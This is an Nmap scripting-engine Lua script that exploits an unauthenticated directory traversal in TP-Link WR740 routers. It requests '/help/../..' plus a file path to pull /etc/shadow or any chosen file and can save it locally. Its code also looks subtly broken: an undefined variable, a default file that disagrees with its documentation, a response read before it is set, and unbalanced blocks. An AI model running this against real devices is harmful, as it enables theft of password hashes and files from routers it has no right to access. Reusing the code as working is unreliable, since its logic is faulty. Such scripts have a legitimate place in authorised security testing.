description = [[
Exploits a directory traversal vulnerability existing in several TP-Link wireless routers.
]]

---
-- @usage
--
-- @output
--
-- @args http-tplink-dir-traversal.rfile Remote file to download. Default: /etc/passwd
-- @args http-tplink-dir-traversal.outfile If set it saves the remote file to this location.
--
-- Other arguments you might want to use with this script:
-- * http.useragent - Sets user agent
-- 

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "vuln", "exploit"}

local http = require "http"
local io = require "io"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

portrule = shortport.http

local TRAVERSAL_QRY = "/help/../.."
local DEFAULT_REMOTE_FILE = "/etc/shadow"

---
--Writes string to file
--Taken from: hostmap.nse
local function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end

---
-- Checks if device is vulnerable by requesting the shadow file and looking for the pattern 'root:'
---
local function check_vuln(host, port)
  local evil_uri = TRAVERSAL_QRY..DEFAULT
  stdnse.print_debug(1, "%s:HTTP GET %s", SCRIPT_NAME, evil_uri)
  local response = http.get(host, port, evil_uri)
  if response.body and response.status==200 and response.body:match("root:") then
    stdnse.print_debug(1, "%s:Pattern 'root:' found.", SCRIPT_NAME, response.body)
    return true
  end
  return false
end

---
-- MAIN
---
action = function(host, port)
  local response, rfile, rpath, uri, evil_uri, rfile_content, filewrite
  local output_lines = {}

  filewrite = stdnse.get_script_args(SCRIPT_NAME..".outfile")
  rfile = stdnse.get_script_args(SCRIPT_NAME..".rfile") or DEFAULT_REMOTE_FILE
  local vuln = {
       title = 'Path traversal in TP-Link WR740 and possibly others',
       state = vulns.STATE.NOT_VULN, 
       description = [[
TP-Link WR740 is vulnerable to a path traversal vulnerability. This vulnerability can be exploited with no authentication and gives attackers access to any file in the system.]],
       references = {
           'http://websec.ca/advisories/'
       },
       dates = {
           disclosure = {year = '2012', month = '01', day = '1'},
       },
     }
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

  local is_vulnerable = check_vuln(host, port)
  if is_vulnerable then
    vuln.state = vulns.STATE.EXPLOIT
    if response.body and response.status==200 then
      stdnse.print_debug(1, "%s", response.body)
      if response.body:match("Error") then
        stdnse.print_debug(1, "%s:[Error] File not found:%s", SCRIPT_NAME, rfile)
        return
      end
      response = http.get(host, port, TRAVERSAL_QRY..rfile)
      local  _, _, rfile_content = string.find(response.body, 'SCRIPT>(.*)')
      output_lines[#output_lines+1] = rfile.." :\n"..rfile_content
      if filewrite then
        local status, err = write_file(filewrite,  rfile_content)
      if status then
        output_lines[#output_lines+1] = string.format("%s saved to %s\n", rfile, filewrite)
      else
        output_lines[#output_lines+1] = string.format("Error saving %s to %s: %s\n", rfile, filewrite, err)
      end
    end
    return stdnse.strjoin("\n", output_lines)
  end
end
